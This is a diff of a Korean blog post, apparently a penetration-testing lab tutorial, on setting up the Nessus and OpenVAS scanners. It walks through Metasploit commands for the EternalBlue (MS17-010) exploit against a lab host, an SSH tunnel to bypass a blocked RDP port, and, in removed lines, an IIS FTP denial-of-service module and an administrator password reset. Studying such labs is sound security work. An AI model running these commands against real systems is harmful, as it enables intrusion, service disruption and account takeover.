@@ -1,179 +1,88 @@
----
+﻿---
 layout: post
-title: "취약점 스캐너 (Nessus & OpenVAS)"
+title: "Nessus & OpenVAS"
 date: 2025-11-06 17:00:00 +0900
 categories: [hacking-tools]
 ---
 
 ## 1. 개요
 
-취약점 스캐너는 시스템, 네트워크, 웹 애플리케이션의 보안 취약점을 자동으로 탐지하는 도구입니다. 모의해킹의 정보 수집 단계에서 핵심적인 역할을 합니다.
-
-| 도구 | 유형 | 라이선스 | 특징 |
-|------|------|----------|------|
-| **Nessus** | 상용 (Essentials 무료) | 유료/제한적 무료 | 업계 표준, 빠른 스캔, 직관적 UI |
-| **OpenVAS** | 오픈소스 | 무료 (GPL) | GVM의 일부, 커뮤니티 기반 |
+**취약점 스캐너(Vulnerability Scanner)**는 네트워크에 연결된 자산의 OS 버전, 서비스 포트, 설정 오류 등을 자동으로 탐지하여 알려진 취약점(CVE) 존재 여부를 식별하는 도구이다.
+대표적인 도구로는 상용 솔루션인 **Nessus**와 오픈소스 기반의 **OpenVAS (GVM)**가 있다.
+본 글에서는 두 도구의 설치 및 기본 사용법을 익히고, 탐지된 취약점을 Metasploit과 연계하여 실제 공격(Exploit)까지 수행하는 과정을 다룬다.
 
 ---
 
-## 2. Nessus
+## 2. Nessus 설치 및 사용
 
-### 설치 (Kali Linux)
+Nessus는 세계에서 가장 널리 사용되는 스캐너로, UI가 직관적이고 최신 취약점 데이터베이스(Plugin) 업데이트가 빠르다.
 
-```bash
-# 패키지 다운로드
-curl --request GET \
-  --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.10.1-debian10_amd64.deb' \
-  --output 'Nessus-10.10.1-debian10_amd64.deb'
-
-# 설치
-dpkg -i Nessus-10.10.1-debian10_amd64.deb
-
-# 서비스 시작
-systemctl enable --now nessusd
-```
-
-### 초기 설정
-
-1. 브라우저에서 `https://<IP>:8834/` 접속
-2. Activation Code 입력 (Tenable 웹사이트에서 무료 발급)
-3. 관리자 계정 생성 후 플러그인 자동 다운로드 (약 10~30분 소요)
+### 설치 및 설정
+1.  **다운로드**: Tenable 공식 사이트에서 설치 파일(.deb)을 받아 설치한다.
+    ```bash
+    dpkg -i Nessus-10.10.1-debian10_amd64.deb
+    systemctl enable --now nessusd
+    ```
+2.  **웹 접속**: `https://<IP>:8834`로 접속하여 관리자 계정을 생성하고, 무료 라이선스 코드(Essentials)를 입력하여 플러그인을 활성화한다.
 
 ### 스캔 수행
-
-1. **New Scan** → **Basic Network Scan** 선택
-2. Target에 스캔 대상 IP 입력 (예: `10.0.0.31`)
-3. 스캔 완료 후 취약점 목록 확인
-4. 심각도별(Critical, High, Medium, Low) 분류된 결과 분석
-
-### Metasploit 연동
-
-Nessus에서 탐지된 취약점을 Metasploit으로 공격할 수 있습니다.
-
-```bash
-msfconsole
-
-# 예: IIS FTP 취약점 (MS11-004) 검증
-search ms11-004
-use auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof
-set RHOSTS 10.0.0.31
-run
-```
+1.  **New Scan**: 대시보드에서 `Basic Network Scan`을 선택한다.
+2.  **Target 설정**: 점검할 대상 IP 대역(예: `10.0.0.0/24`)을 입력하고 실행한다.
+3.  **결과 분석**: 발견된 취약점은 위험도(Critical, High, Medium, Low)에 따라 분류되며, 각 항목을 클릭하면 상세한 해결 방안(Remediation)을 확인할 수 있다.
 
 ---
 
-## 3. OpenVAS (GVM)
+## 3. OpenVAS 설치
 
-### 설치 (Kali Linux)
+OpenVAS는 **GVM (Greenbone Vulnerability Manager)**의 스캐너 모듈로, 비용 부담 없이 사용할 수 있는 강력한 오픈소스 도구이다.
 
+### 설치
+설치 과정이 다소 복잡하고 시간이 오래 걸린다.
 ```bash
-# GVM(Greenbone Vulnerability Manager) 설치
 apt-get install -y gvm
-
-# 초기 설정 (시간 소요)
-gvm-setup
+gvm-setup  # 초기 설정 및 피드 업데이트 (장시간 소요)
+gvm-check-setup # 설치 상태 검증
 ```
 
-초기 설정 완료 시 admin 비밀번호가 출력됩니다:
-```
-[*] User created with password '61996a5a-eab3-4175-a703-9b872db709f7'.
-```
-
-### 비밀번호 재설정
-
-```bash
-gvm-stop
-
-# PostgreSQL 접속
-sudo -u postgres psql gvmd
-
-# 비밀번호 변경
-UPDATE users SET password = crypt('newpassword', gen_salt('bf')) WHERE name = 'admin';
-\q
-
-gvm-start
-```
-
-### 서비스 확인 및 시작
-
-```bash
-# 설정 검증
-gvm-check-setup
-
-# 서비스 시작
-gvm-start
-```
-
-### 웹 인터페이스 접속
-
-- URL: `https://localhost:9392`
-- 기본 계정: admin / (설정 시 출력된 비밀번호)
+### 사용법
+웹 인터페이스(`https://localhost:9392`)에 접속하여 `Tasks` 메뉴에서 새 스캔 작업을 등록하여 실행한다. Nessus와 유사하게 보고서 형태로 결과를 제공한다.
 
 ---
 
-## 4. EternalBlue (MS17-010) 익스플로잇
+## 4. 공격 실습: EternalBlue
 
-취약점 스캐너로 탐지 후 Metasploit으로 공격하는 예시입니다.
+스캐너가 `Critical` 등급으로 탐지한 SMB 취약점(MS17-010)을 Metasploit을 이용해 공격한다.
 
 ```bash
 msfconsole
-
-# EternalBlue 검색
-search ms17-010
-
-# 익스플로잇 선택
-use exploit/windows/smb/ms17_010_eternalblue
-
-# 옵션 확인
-options
-
-# 대상 설정
-set RHOSTS 10.0.0.31
-run
+msf6 > search ms17-010
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 > set RHOSTS 10.0.0.31
+msf6 > run
 ```
 
-### 성공 시 (Meterpreter 획득)
-
-```
-[*] Meterpreter session 1 opened
-meterpreter > shell
-C:\Windows\system32> net user administrator NewPassword123!
-```
+공격이 성공하면 `Meterpreter` 세션이 연결되며, 시스템 최고 권한(`SYSTEM`)을 획득하게 된다.
 
 ---
 
-## 5. SSH 터널링을 통한 RDP 접속
+## 5. 공격 실습: RDP 우회
 
-내부망 서버에 직접 접근이 불가할 때 SSH 터널을 통해 우회합니다.
+내부망 침투 후 방화벽으로 인해 RDP(3389) 접근이 차단된 경우, SSH 터널링을 통해 우회 접속한다.
 
 ```bash
-# Terminal 1: SSH 터널 생성
+# 로컬 포트 9999를 대상 서버(10.0.0.31)의 3389 포트로 포워딩
 ssh -L 9999:10.0.0.31:3389 vagrant@10.0.0.31
 
-# Terminal 2: 터널 상태 확인
-ss -nat | grep 9999
-
-# Terminal 2: RDP 연결
+# 로컬호스트로 RDP 접속
 rdesktop -u vagrant -p vagrant -k ko 127.0.0.1:9999
 ```
 
 ---
 
-## 6. 실시간 네트워크 모니터링 (Sysinternals)
+## 6. 실시간 모니터링
 
-Windows 환경에서 공격 탐지용으로 활용합니다.
-
-- **TCPView**: 실시간 TCP/UDP 연결 모니터링
-- **Process Explorer**: 프로세스별 네트워크 연결 확인
-
-```
-# 다운로드
-https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview
-
-# 실행
-tcpview64.exe
-```
-
-공격 발생 시 의심스러운 연결(비정상 포트, 외부 IP)을 즉시 확인할 수 있습니다.
+윈도우 시스템에서 공격 징후를 탐지하기 위해 **Sysinternals Suite**를 활용한다.
+*   **TCPView**: 실시간으로 열린 포트와 프로세스 연결 정보를 확인한다. (RDP 터널링 연결 확인 등)
+*   **Process Explorer**: 실행 중인 프로세스의 부모-자식 관계를 파악하여 악성 프로세스를 식별한다.
 
 <hr class="short-rule">
